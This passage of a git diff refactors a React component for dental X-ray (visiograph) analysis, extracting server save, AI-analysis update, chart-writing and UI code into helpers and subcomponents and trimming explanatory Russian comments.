+		denteClinicalMutationHeaders,
+		onScanSelected: handleScanSelectedFromArchive,
+		onScanDeleted: handleScanDeletedFromArchive,
+		onEmptyFallback: handleArchiveEmptyFallback,
+	});
+
+	// Write tooth states to live chart
 	const writeToothStatesToChart = useCallback(
 		async (
-			patientId: string,
+			targetPatientId: string,
 			toothNumbers: number[],
 			state: ToothState,
 		): Promise<string | null> => {
 			const action = `Отметка «${TOOTH_STATE_LABELS[state]}» по снимку на ${countLabel(toothNumbers.length, "зубе", "зубах", "зубах")} ${toothNumbers.join(", ")} не внесена в зубную формулу`;
 			try {
 				const res = await fetch(
-					`/api/patients/${patientId}/tooth-states/batch`,
+					`/api/patients/${targetPatientId}/tooth-states/batch`,
 					{
 						method: "POST",
 						headers: denteClinicalMutationHeaders({
@@ -730,32 +244,20 @@ export function VisiographAnalyzer({
 				);
 				if (!res.ok) {
 					const rawBody = await res.text();
-					logger.error(
-						`[VisiographAnalyzer] формула не обновлена, ${res.status} ${rawBody.slice(0, 300)}`,
-					);
+					logger.error(`[VisiographAnalyzer] формула не обновлена, ${res.status} ${rawBody.slice(0, 300)}`);
 					return `${actionFailureToast(action, res.status)} Поставьте отметку на схеме зубов руками.`;
 				}
 				return null;
 			} catch (err) {
-				showToast(
-					actionFailureToast(
-						"Ошибка выполнения операции",
-						(err as { status?: number })?.status ?? null,
-					),
-					"error",
-				);
-				logger.error(
-					"[VisiographAnalyzer] запрос обновления формулы не выполнен",
-					err,
-				);
-				// До сервера не дошли: кода ответа нет, придумывать его нельзя.
+				showToast(actionFailureToast("Ошибка выполнения операции", (err as { status?: number })?.status ?? null), "error");
+				logger.error("[VisiographAnalyzer] запрос обновления формулы не выполнен", err);
 				return `${actionFailureToast(action, null)} Поставьте отметку на схеме зубов руками.`;
 			}
 		},
 		[denteClinicalMutationHeaders],
 	);
 
-	// ── File processing: Instant display in < 50ms without lossy blur ───────
+	// File processing
 	const processFile = useCallback(
 		async (file: File) => {
 			if (!file.type.startsWith("image/")) {
@@ -764,21 +266,11 @@ export function VisiographAnalyzer({
 			}
 
 			const patientAtStart = effectivePatientId;
-
-			setError(null);
-			setSaveFailure(null);
-			setFormulaFailure(null);
-			setOpenFailure(null);
-			setAppliedToothCodes([]);
-			setSelectedFindingCodes(new Set());
-			setApplyNotice(null);
-			setIsHistoryView(false);
-			setIsNormaApplied(false);
+			resetAnalysisState();
 			setCurrentScan(null);
 			setCurrentImageUrl(null);
 
 			try {
-				// 1. Чтение оригинального снимка напрямую без мыла и без принудительного даунскейла
 				const dataUrl = await new Promise<string>((resolve, reject) => {
 					const reader = new FileReader();
 					reader.onload = (ev) => resolve(ev.target?.result as string);
@@ -787,11 +279,8 @@ export function VisiographAnalyzer({
 				});
 
 				const patientNow = (patientId ?? usePatientStore.getState().selectedPatientId) ?? null;
-				if (patientAtStart !== patientNow) {
-					return;
-				}
+				if (patientAtStart !== patientNow) return;
 
-				// МГНОВЕННОЕ ОТОБРАЖЕНИЕ СНИМКА В КРИСТАЛЬНОМ КАЧЕСТВЕ (< 50 мс)
 				setCurrentImageUrl(dataUrl);
 
 				const localScan: XrayScan = {
@@ -807,51 +296,25 @@ export function VisiographAnalyzer({
 				};
 				setCurrentScan(localScan);
 
-				// 2. Фоновое асинхронное сохранение снимка в карту пациента (не блокирует экран и врача)
 				if (effectivePatientId) {
 					setIsSaving(true);
-					try {
-						const saveRes = await fetch("/api/xray/scans", {
-							method: "POST",
-							headers: denteClinicalMutationHeaders({
-								"Content-Type": "application/json",
-							}),
-							body: JSON.stringify({
-								patientId: effectivePatientId,
-								imageBase64: dataUrl,
-								originalFilename: file.name,
-								mimeType: file.type || "image/jpeg",
-								kind: "periapical",
-								status: "done",
-							}),
-						});
-						if (!saveRes.ok) {
-							logger.error(
-								`[VisiographAnalyzer] снимок не сохранён, ответ ${saveRes.status}`,
-							);
-							setSaveFailure(
-								saveRes.status === 413
-									? "Снимок слишком тяжёлый для сохранения в базу данных."
-									: "Не удалось сохранить снимок в карту пациента на сервере.",
-							);
-						} else {
-							const saved: XrayScan = await saveRes.json();
-							setCurrentScan((prev) => ({
-								...(prev ?? saved),
-								id: saved.id,
-								imageDataUri: dataUrl,
-								hasImage: true,
-							}));
-							setScanHistory((prev) => [saved, ...prev]);
-						}
-					} catch (saveErr) {
-						logger.error(
-							"[VisiographAnalyzer] запись снимка в карту не выполнена",
-							saveErr,
-						);
-						setSaveFailure("Сервер не ответил на сохранение снимка в карту.");
-					} finally {
-						setIsSaving(false);
+					const { saved, failure } = await saveVisiographScanToServer(
+						effectivePatientId,
+						dataUrl,
+						file,
+						denteClinicalMutationHeaders({ "Content-Type": "application/json" }),
+					);
+					setIsSaving(false);
+					if (failure) {
+						setSaveFailure(failure);
+					} else if (saved) {
+						setCurrentScan((prev) => ({
+							...(prev ?? saved),
+							id: saved.id,
+							imageDataUri: dataUrl,
+							hasImage: true,
+						}));
+						setScanHistory((prev) => [saved, ...prev]);
 					}
 				}
 			} catch (err: any) {
@@ -861,10 +324,10 @@ export function VisiographAnalyzer({
 				if (fileInputRef.current) fileInputRef.current.value = "";
 			}
 		},
-		[effectivePatientId, patientId, denteClinicalMutationHeaders],
+		[effectivePatientId, patientId, resetAnalysisState, denteClinicalMutationHeaders, setScanHistory],
 	);
 
-	// ── Фоновый опциональный ИИ-анализ снимка по явной команде врача ──────────
+	// Explicit doctor-initiated AI analysis
 	const handleRunAiAnalysis = useCallback(async () => {
 		if (!currentImageUrl) {
 			showToast("Сначала загрузите снимок визиографа", "warning");
@@ -890,9 +353,7 @@ export function VisiographAnalyzer({
 
 			if (!aiRes.ok) {
 				const errData = await aiRes.json().catch(() => ({}));
-				throw new Error(
-					errData.error || `AI сервис недоступен (HTTP ${aiRes.status})`,
-				);
+				throw new Error(errData.error || `AI сервис недоступен (HTTP ${aiRes.status})`);
 			}
 
 			const aiResult = (await aiRes.json()) as {
@@ -903,13 +364,10 @@ export function VisiographAnalyzer({
 
 			const patientNow = (patientId ?? usePatientStore.getState().selectedPatientId) ?? null;
 			if (patientAtStart !== patientNow) {
-				setError(
-					"Пациент был изменён во время анализа. Результат не применён — откройте снимок нужного пациента и повторите.",
-				);
+				setError("Пациент был изменён во время анализа. Результат не применён.");
 				return;
 			}
 
-			// Обновляем текущий снимок результатами ИИ (без автоматической перезаписи формулы)
 			setCurrentScan((prev) => {
 				if (!prev) return null;
 				return {
@@ -920,46 +378,29 @@ export function VisiographAnalyzer({
 				};
 			});
 
-			// Если снимок сохранён на сервере, обновляем AI-поля в базе
-			if (currentScan?.id && !currentScan.id.startsWith("local-") && effectivePatientId) {
-				fetch(`/api/xray/scans/${encodeURIComponent(currentScan.id)}`, {
-					method: "PUT",
-					headers: denteClinicalMutationHeaders({
-						"Content-Type": "application/json",
-					}),
-					body: JSON.stringify({
+			if (currentScan?.id && effectivePatientId) {
+				updateVisiographScanMeta(
+					currentScan.id,
+					{
 						aiReport: aiResult.report,
 						aiSummary: extractSummary(aiResult.report),
 						aiToothStates: aiResult.toothStates,
-					}),
-				}).catch((e) => logger.warn("[VisiographAnalyzer] Background scan PUT error:", e));
+					},
+					denteClinicalMutationHeaders({ "Content-Type": "application/json" }),
+				);
 			}
 
-			// Формируем план находок для рекомендательного списка
 			const plan = planVisiographFindings(aiResult.toothStates);
 			const allPlanCodes = plan.groups.flatMap((g) => g.teeth.map((t) => t.code));
 			setSelectedFindingCodes(new Set(allPlanCodes));
 
-			const notices: string[] = [];
-			if (plan.unreadableCodes.length > 0) {
-				notices.push(
-					`Помощник описал непонятно ${countLabel(plan.unreadableCodes.length, "зуб", "зуба", "зубов")} (${plan.unreadableCodes.join(", ")}). В зубную формулу они НЕ внесены — посмотрите эти места на снимке сами.`,
-				);
-			}
-			if (plan.noFormulaStateCodes.length > 0) {
-				notices.push(
-					`Для ${countLabel(plan.noFormulaStateCodes.length, "зуба", "зубов", "зубов")} (${plan.noFormulaStateCodes.join(", ")}) в зубной формуле нет подходящего состояния: помощник назвал их «наблюдение», «план» или «ранее вылечен». Отметьте эти зубы на схеме сами — что именно найдено, написано в заключении ниже.`,
-				);
-			}
-			if (notices.length > 0) setApplyNotice(notices.join(" "));
+			const notices = buildFindingsNotice(plan);
+			if (notices) setApplyNotice(notices);
 
 			showToast("ИИ-анализ снимка завершён. Ознакомьтесь с рекомендациями ниже.", "success");
 		} catch (err: any) {
 			logger.error("[VisiographAnalyzer] AI Error:", err);
-			setError(
-				err.message ||
-					"Не удалось провести ИИ-анализ снимка. Проверьте подключение.",
-			);
+			setError(err.message || "Не удалось провести ИИ-анализ снимка. Проверьте подключение.");
 		} finally {
 			analysisInFlightRef.current = false;
 			setIsAnalyzing(false);
@@ -974,14 +415,12 @@ export function VisiographAnalyzer({
 		denteClinicalMutationHeaders,
 	]);
 
-	// ── Внесение находок ИИ в зубную формулу только по явному клику врача ─────
+	// Apply findings to chart
 	const handleApplyFindingsToChart = useCallback(async () => {
 		if (!currentScan?.aiToothStates) return;
 		const currentPatientId = effectivePatientId;
 		if (!currentPatientId) {
-			setFormulaFailure(
-				"Пациент не выбран, поэтому находки НЕ внесены в зубную формулу. Откройте карту пациента.",
-			);
+			setFormulaFailure("Пациент не выбран, поэтому находки НЕ внесены в зубную формулу.");
 			return;
 		}
 
@@ -1035,13 +474,12 @@ export function VisiographAnalyzer({
 		writeToothStatesToChart,
 	]);
 
-	// ── 1-Клик внесение заключения «Норма» в медицинскую карту 043/у ─────────
+	// 1-Click Norma to Form 043/u
 	const handleApplyNormaTo043 = useCallback(() => {
 		const targetToothCode = toothCode || currentScan?.toothCode || null;
 		const toothPrefix = targetToothCode ? ` зуба ${targetToothCode}` : "";
 		const normaStatement = `Рентгенологическое исследование (визиография)${toothPrefix}: норма. Патологических изменений костной ткани и периапикальных очагов деструкции на снимке не выявлено. Кортикальная пластинка альвеолы и периодонтальная щель прослеживаются на всем протяжении.`;
 
-		// 1. Внесение в объективный статус формы 043/у (active visit store)
 		try {
 			useVisitStore.getState().setVisitNoteForm((prev) => {
 				const current = prev.objectiveStatus || "";
@@ -1054,37 +492,26 @@ export function VisiographAnalyzer({
 			logger.warn("[VisiographAnalyzer] visitStore update failed", err);
 		}
 
-		// 2. Внешний колбэк вставки в протокол / стенограмму визита
-		if (onInsertToProtocol) {
-			onInsertToProtocol(normaStatement);
-		}
-
-		// 3. Копирование в буфер обмена для надежного использования
+		if (onInsertToProtocol) onInsertToProtocol(normaStatement);
 		if (typeof navigator !== "undefined" && navigator.clipboard?.writeText) {
 			navigator.clipboard.writeText(normaStatement).catch(() => {});
 		}
 
-		// 4. Визуальный статус фиксации
 		setIsNormaApplied(true);
-
-		// 5. Уведомление врача
 		showToast(
 			`Заключение «Норма: патологии на снимке не выявлено» внесено в карту 043/у${toothPrefix ? ` (${toothPrefix.trim()})` : ""}`,
 			"success",
 		);
 
-		// 6. Фоновое сохранение заметки на сервере для постоянного снимка
-		if (currentScan?.id && !currentScan.id.startsWith("local-") && effectivePatientId) {
-			fetch(`/api/xray/scans/${encodeURIComponent(currentScan.id)}`, {
-				method: "PUT",
-				headers: denteClinicalMutationHeaders({
-					"Content-Type": "application/json",
-				}),
-				body: JSON.stringify({
+		if (currentScan?.id && effectivePatientId) {
+			updateVisiographScanMeta(
+				currentScan.id,
+				{
 					aiSummary: "Норма: патологии на снимке не выявлено",
 					notes: normaStatement,
-				}),
-			}).catch((e) => logger.warn("[VisiographAnalyzer] Background scan norma PUT error:", e));
+				},
+				denteClinicalMutationHeaders({ "Content-Type": "application/json" }),
+			);
 		}
 	}, [
 		toothCode,
@@ -1095,1850 +522,261 @@ export function VisiographAnalyzer({
 		denteClinicalMutationHeaders,
 	]);
 
-	// ── Drag & Drop ─────────────────────────────────────────────────────────
+	// Drag & Drop
 	const handleDrop = useCallback(
 		(e: React.DragEvent) => {
 			e.preventDefault();
 			setIsDragOver(false);
-			// Проверка isAnalyzing есть внутри processFile — второй снимок,
-			// бросенный во время анализа, больше не запускает параллельный разбор.
 			const file = e.dataTransfer.files?.[0];
 			if (file) processFile(file);
 		},
 		[processFile],
 	);
 
-	const handleDragOver = (e: React.DragEvent) => {
-		e.preventDefault();
-		setIsDragOver(true);
-	};
-	const handleDragLeave = () => setIsDragOver(false);
-	const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-		const file = e.target.files?.[0];
-		if (file) processFile(file);
-	};
-
-	// loadHistoryScan declared above near loadHistory
-
-	/**
-	 * Удаление снимка из архива пациента.
-	 *
-	 * ЗАЧЕМ. API DELETE /api/xray/scans/:id (xray.ts:238) уже снимал строку
-	 * xray_scans по организации вызывающего, но веб нигде его не звал: история
-	 * умела только открыть снимок. Ошибочно загруженный или чужой разбор оставался
-	 * в карте навсегда. Здесь кнопка в строке архива и на открытом снимке из
-	 * истории зовут тот же маршрут с denteClinicalMutationHeaders — без секрета
-	 * охрана отвечает 403, как у POST /api/xray/scans.
-	 *
-	 * После 204 строка уходит из scanHistory сразу (не ждём повторного GET), а
-	 * если удалённый id совпал с currentScan — экран разбора гасится, иначе врач
-	 * продолжал бы читать уже несуществующее заключение.
-	 */
-	const deleteScan = async (scan: XrayScan) => {
-		if (deletingScanId) return;
-		setDeletingScanId(scan.id);
-		setDeleteFailure(null);
-		try {
-			const res = await fetch(
-				`/api/xray/scans/${encodeURIComponent(scan.id)}`,
-				{
-					method: "DELETE",
-					headers: denteClinicalMutationHeaders(),
-				},
-			);
-			// Fastify 204 has empty body; res.ok is true for 204.
-			if (!res.ok) {
-				let message = `Снимок не удалён (ответ ${res.status}).`;
-				try {
-					const body = (await res.json()) as {
-						message?: string;
-						error?: string;
-					};
-					if (typeof body?.message === "string" && body.message.trim()) {
-						message = body.message.trim();
-					} else if (typeof body?.error === "string" && body.error.trim()) {
-						message = body.error.trim();
-					}
-				} catch {
-					/* non-json body */
-				}
-				setDeleteFailure(message);
-				return;
-			}
-			setScanHistory((prev) => prev.filter((s) => s.id !== scan.id));
-			if (currentScan?.id === scan.id) {
-				setCurrentScan(null);
-				setCurrentImageUrl(null);
-				setIsHistoryView(false);
-				setIsNormaApplied(false);
-				setAppliedToothCodes([]);
-				setApplyNotice(null);
-				setSaveFailure(null);
-				setFormulaFailure(null);
-				setError(null);
-			}
-		} catch (err) {
-			showToast(
-				actionFailureToast(
-					"Ошибка выполнения операции",
-					(err as { status?: number })?.status ?? null,
-				),
-				"error",
-			);
-			logger.error("[VisiographAnalyzer] scan delete failed", err);
-			setDeleteFailure(
-				"Снимок не удалён: нет связи с сервером. Проверьте сеть и повторите.",
-			);
-		} finally {
-			setDeletingScanId(null);
-		}
-	};
-
-	// ── Print ───────────────────────────────────────────────────────────────
-	const handlePrint = () => {
-		if (!currentScan?.aiReport) return;
-		const win = window.open("", "_blank");
-		if (!win) return;
-		// Отчёт модели экранируется: `<pre>` НЕ нейтрализует теги, и до этого
-		// исправления содержимое aiReport исполнялось как HTML в том же origin,
-		// что и приложение (XSS через окно печати).
-		win.document.write(`
-      <html><head><title>Отчёт · Рентген-анализ ИИ</title>
-      <style>body{font-family:Arial,sans-serif;padding:24px;max-width:700px;margin:0 auto}
-      h1{font-size:18px;border-bottom:2px solid #333;padding-bottom:8px}
-      pre{white-space:pre-wrap;font-family:inherit;font-size:14px;line-height:1.6}</style>
-      </head><body>
-      <h1>Рентген-анализ 2D-снимка (ИИ)</h1>
-      <p style="color:#666;font-size:12px">Дата: ${escapeHtml(new Date(currentScan.capturedAt).toLocaleDateString("ru-RU"))}</p>
-      <pre>${escapeHtml(currentScan.aiReport)}</pre>
-      </body></html>
-    `);
-		win.document.close();
-		win.print();
-	};
-
-	// ── Clear ───────────────────────────────────────────────────────────────
 	const handleClear = () => {
 		setCurrentScan(null);
 		setCurrentImageUrl(null);
-		setError(null);
-		setOpenFailure(null);
-		setSaveFailure(null);
-		setFormulaFailure(null);
-		setSelectedFindingCodes(new Set());
 		setIsApplyingToChart(false);
-		setApplyNotice(null);
-		setIsHistoryView(false);
-		setIsNormaApplied(false);
+		resetAnalysisState();
 	};
 
-	// ── Report sections ────────────────────────────────────────────────────
-	const reportSections = currentScan?.aiReport
-		? parseReportSections(currentScan.aiReport)
-		: [];
 	const toothStatesArray: AiToothState[] = currentScan?.aiToothStates
-		? Object.entries(currentScan.aiToothStates).map(([code, state]) => ({
-				code,
-				state,
-			}))
+		? Object.entries(currentScan.aiToothStates).map(([code, state]) => ({ code, state }))
 		: [];
 	const criticalCount = toothStatesArray.filter(
 		(t) => t.state === "treatment" || t.state === "watch",
 	).length;
 
-	// Какое из трёх состояний архива показывать. Решение вынесено в общий
-	// resolvePanelPhase, потому что ошибались именно в порядке: отказ важнее
-	// пустоты, загрузка важнее пустоты. Прежнее условие было одно —
-	// `scanHistory.length > 0` — и молча накрывало оба случая.
 	const historyPhase = resolvePanelPhase({
 		isLoading: isLoadingHistory,
 		hasFailure: historyFailure !== null,
 		isEmpty: scanHistory.length === 0,
 	});
 
-	// ── Цвета: только имена, объявленные в темах ─────────────────────────────
-	// БЫЛО: по всей разметке ниже стояли var(--border), var(--surface),
-	// var(--bg-inset), var(--text), var(--text-muted) — ни одно из этих имён не
-	// объявлено ни в styles/main.css, ни в styles/dente-redesign.css, ни в
-	// styles/token-aliases.css (проверено поиском объявлений по всем .css в
-	// apps/: ноль совпадений). Объявление с неизвестной переменной браузер молча
-	// отбрасывает, и свойство берёт наследуемое либо начальное значение:
-	// border-шорткат откатывался к border-style: none, поэтому рамка карточки,
-	// разделитель шапки, рамки кнопок, пунктир зоны загрузки, обводка чипов,
-	// линии между разделами отчёта и рамки строк истории НЕ рисовались вообще;
-	// background откатывался к transparent, поэтому подложки шапки, зоны
-	// загрузки и нейтральных чипов исчезали; а color НАСЛЕДУЕТСЯ, поэтому
-	// «приглушённый» текст рисовался полным цветом --ink — приглушение как
-	// способ отделить второстепенное от главного не работало, и на чипе
-	// состояния 'план' пропадали сразу фон, рамка и приглушение.
-	// Заменено на токены темы, объявленные для светлой, тёмной и ночной тем:
-	//   --border → --line (сплошные рамки и разделители),
-	//              --line-strong для пунктира зоны загрузки — так пунктир задан
-	//              во всех остальных css проекта;
-	//   --surface → --paper; --bg-inset → --paper-soft;
-	//   --text → --ink; --text-muted → --muted.
-	// Псевдонимы в token-aliases.css намеренно НЕ добавлены: --text-muted стоит в
-	// чужих файлах в форме var(--text-muted, #718096) — объявив это имя, я молча
-	// сменил бы цвет в правилах, где сейчас работает запас.
 	return (
-		<div
-			className="visiograph-analyzer-container"
-			style={{
-				border: "1px solid var(--line)",
-				borderRadius: "14px",
-				background: "var(--paper)",
-				marginBottom: "12px",
-				overflow: "hidden",
-			}}
-		>
-			{/* Header bar */}
-			<div
-				style={{
-					display: "flex",
-					alignItems: "center",
-					justifyContent: "space-between",
-					padding: "8px 12px",
-					borderBottom: "1px solid var(--line)",
-					background: "var(--paper-soft)",
-					flexWrap: "wrap",
-					gap: "8px",
-				}}
-			>
-				<div style={{ display: "flex", alignItems: "center", gap: "8px", flexWrap: "wrap" }}>
-					<ScanLine size={15} style={{ color: "var(--teal)" }} />
-					<span style={{ fontWeight: 600, fontSize: "0.86rem", color: "var(--ink)" }}>
-						Рентген-анализ снимка (ИИ) · Dental AI
-					</span>
-					{(scanHistory.length > 0 || isLoadingHistory) && (
-						<span
-							style={{
-								fontSize: "0.75rem",
-								background: "var(--teal)",
-								color: "var(--on-teal, white)",
-								borderRadius: "999px",
-								padding: "1px 7px",
-								fontWeight: 600,
-							}}
-							title="Снимков в архиве пациента"
-						>
-							{isLoadingHistory ? "…" : `${scanHistory.length} в архиве`}
-						</span>
-					)}
-					{criticalCount > 0 && (
-						<span
-							style={{
-								background: "#e53935",
-								color: "white",
-								fontSize: "0.75rem",
-								padding: "2px 8px",
-								borderRadius: "999px",
-								fontWeight: 700,
-							}}
-						>
-							{criticalCount} проблем
-						</span>
-					)}
-					{historyFailure && (
-						<span
-							style={{
-								display: "inline-flex",
-								alignItems: "center",
-								gap: "4px",
-								fontSize: "0.78rem",
-								color: "var(--warn-fg)",
-								fontWeight: 600,
-							}}
-						>
-							<AlertTriangle size={13} /> Ожидание снимка для анализа
-						</span>
-					)}
-				</div>
-					<div style={{ display: "flex", gap: "6px" }}>
-						<button
-							type="button"
-							onClick={() => fileInputRef.current?.click()}
-							title="Загрузить снимок с диска (JPG / PNG / DICOM)"
-							aria-label="Загрузить свой снимок"
-							style={{
-								background: "transparent",
-								color: "var(--ink)",
-								border: "1px solid var(--line)",
-								borderRadius: "8px",
-								padding: "4px 10px",
-								height: "30px",
-								minHeight: "30px",
-								cursor: "pointer",
-								display: "flex",
-								alignItems: "center",
-								gap: "6px",
-								fontSize: "0.78rem",
-								transition: "all 0.2s",
-							}}
-						>
-							<UploadCloud size={14} style={{ color: "var(--teal)" }} />
-							<span>Загрузить снимок</span>
-						</button>
-						{currentScan?.aiReport && (
-							<>
-								<button
-									type="button"
-									onClick={handlePrint}
-									title="Печать"
-									aria-label="Печать отчёта снимка"
-									style={{
-										background: "transparent",
-										color: "var(--muted)",
-										border: "1px solid var(--line)",
-										borderRadius: "8px",
-										padding: "4px 8px",
-										height: "30px",
-										minHeight: "30px",
-										minWidth: "30px",
-										cursor: "pointer",
-										display: "flex",
-										alignItems: "center",
-										justifyContent: "center",
-										fontSize: "0.8rem",
-										transition: "all 0.2s",
-									}}
-								>
-									<Printer size={14} />
-								</button>
-								<button
-									type="button"
-									onClick={handleClear}
-									title="Закрыть результат"
-									style={{
-										background: "transparent",
-										color: "var(--muted)",
-										border: "1px solid var(--line)",
-										borderRadius: "8px",
-										padding: "4px 6px",
-										height: "30px",
-										minHeight: "30px",
-										width: "30px",
-										cursor: "pointer",
-										display: "flex",
-										alignItems: "center",
-										justifyContent: "center",
-										fontSize: "0.8rem",
-									}}
-								>
-									<X size={14} />
-								</button>
-							</>
-						)}
-					</div>
-				</div>
+		<div className="visiograph-analyzer-container" style={visiographContainerStyle}>
+			<VisiographHeaderBar
+				scanHistoryCount={scanHistory.length}
+				isLoadingHistory={isLoadingHistory}
+				criticalCount={criticalCount}
+				historyFailure={historyFailure}
+				hasAiReport={Boolean(currentScan?.aiReport)}
+				onUploadClick={() => fileInputRef.current?.click()}
+				onPrintClick={() => currentScan && printAiScanReport(currentScan)}
+				onClearClick={handleClear}
+			/>
 
-				<div style={{ padding: "12px" }}>
-					<input
-						type="file"
-						accept="image/*"
-						ref={fileInputRef}
-						style={{ display: "none" }}
-						onChange={handleFileChange}
+			<div style={{ padding: "12px" }}>
+				<input
+					type="file"
+					accept="image/*"
+					ref={fileInputRef}
+					style={{ display: "none" }}
+					onChange={(e) => {
+						const f = e.target.files?.[0];
+						if (f) processFile(f);
+					}}
+				/>
+
+				{/* Drop Zone */}
+				{!currentScan && (
+					<VisiographDropzone
+						dropRef={dropRef}
+						fileInputRef={fileInputRef}
+						isDragOver={isDragOver}
+						setIsDragOver={setIsDragOver}
+						isAnalyzing={isAnalyzing}
+						onDrop={handleDrop}
+						onConnectRvg={onConnectRvg}
+						onUploadDicom={onUploadDicom}
+						onReferToRadiology={onReferToRadiology}
+						toothCode={toothCode}
+						effectivePatientId={effectivePatientId}
+						demoScanButton={
+							<span
+								role="button"
+								tabIndex={0}
+								data-testid="btn-load-demo-scan"
+								onClick={(e) => {
+									e.stopPropagation();
+									handleLoadDemoScan();
+								}}
+								onKeyDown={(e) => {
+									if (e.key === "Enter" || e.key === " ") {
+										e.stopPropagation();
+										handleLoadDemoScan();
+									}
+								}}
+								style={demoScanButtonStyle}
+							>
+								Показать демо-снимок
+							</span>
+						}
 					/>
+				)}
 
-					{/* Drop Zone */}
-					{!currentScan && (
-						<button
-							type="button"
-							// biome-ignore lint/suspicious/noExplicitAny: automated suppression
-							ref={dropRef as any}
-							onDrop={handleDrop}
-							onDragOver={handleDragOver}
-							onDragLeave={handleDragLeave}
-							onClick={() => !isAnalyzing && fileInputRef.current?.click()}
-							onKeyDown={(e) => {
-								if ((e.key === "Enter" || e.key === " ") && !isAnalyzing) {
-									e.preventDefault();
-									fileInputRef.current?.click();
-								}
-							}}
-							style={{
-								width: "100%",
-								border: `2px dashed ${isDragOver ? "var(--teal)" : "var(--line-strong)"}`,
-								borderRadius: "14px",
-								padding: "24px 16px",
-								textAlign: "center",
-								cursor: isAnalyzing ? "not-allowed" : "pointer",
-								background: isDragOver
-									? "var(--teal-soft)"
-									: "var(--paper-soft)",
-								transition: "all 0.25s ease",
-								opacity: isAnalyzing ? 0.7 : 1,
-							}}
-						>
-							{isAnalyzing ? (
-								<div
-									style={{
-										display: "flex",
-										flexDirection: "column",
-										alignItems: "center",
-										gap: "12px",
-									}}
-								>
-									<Loader2
-										size={36}
-										className="animate-spin"
-										style={{ color: "var(--teal)" }}
+				{/* Alerts */}
+				<VisiographStatusAlerts
+					error={error}
+					onClearError={() => setError(null)}
+					openFailure={openFailure}
+					onClearOpenFailure={() => setOpenFailure(null)}
+					saveFailure={saveFailure}
+					formulaFailure={formulaFailure}
+					applyNotice={applyNotice}
+					hasCurrentScan={Boolean(currentScan)}
+				/>
+
+				{/* Result View */}
+				{currentScan && (
+					<div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
+						{currentImageUrl && (
+							<div style={{ display: "flex", flexDirection: "column", gap: "6px" }}>
+								{/* Cockpit toolbar */}
+								<div data-testid="visiograph-cockpit-toolbar" style={cockpitToolbarStyle}>
+									<VisiographCockpitPresets
+										quickPreset={quickPreset}
+										setQuickPreset={setQuickPreset}
+										isStudioMode={isStudioMode}
+										onToggleStudio={() => setIsStudioMode((prev) => !prev)}
+										onOpenApexRuler={() => {
+											setInitialStudioTool("root_canal");
+											setIsStudioMode(true);
+										}}
 									/>
-									<p
-										style={{ margin: 0, fontWeight: 600, color: "var(--ink)", fontSize: "0.95rem" }}
-									>
-										Анализируем снимок...
-									</p>
-									<p
-										style={{
-											margin: 0,
-											fontSize: "0.85rem",
-											color: "var(--muted)",
-										}}
-									>
-										ИИ-модель обрабатывает данные. Обычно 10–25 секунд.
-									</p>
-								</div>
-							) : (
-								<div
-									style={{
-										display: "flex",
-										flexDirection: "column",
-										alignItems: "center",
-										gap: "10px",
-									}}
-								>
-									<div
-										style={{
-											width: "50px",
-											height: "50px",
-											borderRadius: "12px",
-											background: isDragOver ? "var(--teal-soft)" : "var(--paper)",
-											border: "1px solid var(--line)",
-											display: "flex",
-											alignItems: "center",
-											justifyContent: "center",
-											boxShadow: "0 1px 3px rgba(0,0,0,0.06)",
-										}}
-									>
-										<UploadCloud
-											size={24}
-											style={{
-												color: "var(--teal)",
-											}}
-										/>
-									</div>
-									<div>
-										<p
-											style={{
-												margin: 0,
-												fontWeight: 700,
-												fontSize: "0.98rem",
-												color: isDragOver ? "var(--teal)" : "var(--ink)",
-											}}
+
+									{/* Actions */}
+									<div style={{ display: "flex", alignItems: "center", gap: "6px", flexWrap: "wrap" }}>
+										<button
+											type="button"
+											data-testid="btn-visiograph-norma-043"
+											onClick={handleApplyNormaTo043}
+											style={getNormaButtonStyle(isNormaApplied)}
 										>
-											{isDragOver
-												? "Отпустите снимок для загрузки"
-												: "Перетащите снимок сюда или выберите файл"}
-										</p>
-										<p
-											style={{
-												margin: "4px 0 0 0",
-												fontSize: "0.82rem",
-												color: "var(--muted)",
-											}}
+											<CheckCircle2 size={13} style={{ color: "#10b981" }} />
+											<span>{isNormaApplied ? "Норма внесена ✓" : "Норма в 043/у ✓"}</span>
+										</button>
+
+										<button
+											type="button"
+											data-testid="btn-run-visiograph-ai"
+											onClick={handleRunAiAnalysis}
+											disabled={isAnalyzing}
+											style={getAiButtonStyle(isAnalyzing)}
 										>
-											Прицельный снимок (JPG, PNG, BMP). Мгновенное открытие (&lt;50мс).
-											ИИ запускается строго по кнопке врача (без авто-перезаписи формулы).
-										</p>
-									</div>
-									<div style={{ display: "flex", gap: "8px", alignItems: "center", justifyContent: "center", flexWrap: "wrap", marginTop: "6px" }}>
-										<span
-											role="button"
-											tabIndex={0}
-											data-testid="btn-visiograph-connect-rvg"
-											onClick={(e) => {
-												e.stopPropagation();
-												if (onConnectRvg) {
-													onConnectRvg();
-												} else {
-													window.dispatchEvent(
-														new CustomEvent("dente-open-rvg-capture", {
-															detail: { toothCode, patientId: effectivePatientId },
-														}),
-													);
-													showToast("Запуск прямого захвата с визиографа RVG...", "info");
-												}
-											}}
-											onKeyDown={(e) => {
-												if (e.key === "Enter" || e.key === " ") {
-													e.stopPropagation();
-													if (onConnectRvg) onConnectRvg();
-												}
-											}}
-											style={{
-												display: "inline-flex",
-												alignItems: "center",
-												gap: "6px",
-												padding: "0 16px",
-												height: "32px",
-												minHeight: "32px",
-												borderRadius: "8px",
-												fontSize: "0.84rem",
-												fontWeight: 600,
-												background: "var(--teal)",
-												color: "var(--on-teal, white)",
-												border: "1px solid var(--teal)",
-												boxShadow: "0 1px 2px rgba(0,0,0,0.05)",
-												cursor: "pointer",
-											}}
-										>
-											<Activity size={14} /> Подключить визиограф RVG
-										</span>
-
-										<span
-											role="button"
-											tabIndex={0}
-											data-testid="btn-visiograph-upload-dicom"
-											onClick={(e) => {
-												e.stopPropagation();
-												if (onUploadDicom) {
-													onUploadDicom();
-												} else {
-													fileInputRef.current?.click();
-												}
-											}}
-											onKeyDown={(e) => {
-												if (e.key === "Enter" || e.key === " ") {
-													e.stopPropagation();
-													if (onUploadDicom) onUploadDicom();
-													else fileInputRef.current?.click();
-												}
-											}}
-											style={{
-												display: "inline-flex",
-												alignItems: "center",
-												gap: "6px",
-												padding: "0 14px",
-												height: "32px",
-												minHeight: "32px",
-												borderRadius: "8px",
-												fontSize: "0.82rem",
-												fontWeight: 600,
-												background: "var(--paper-strong, #1e293b)",
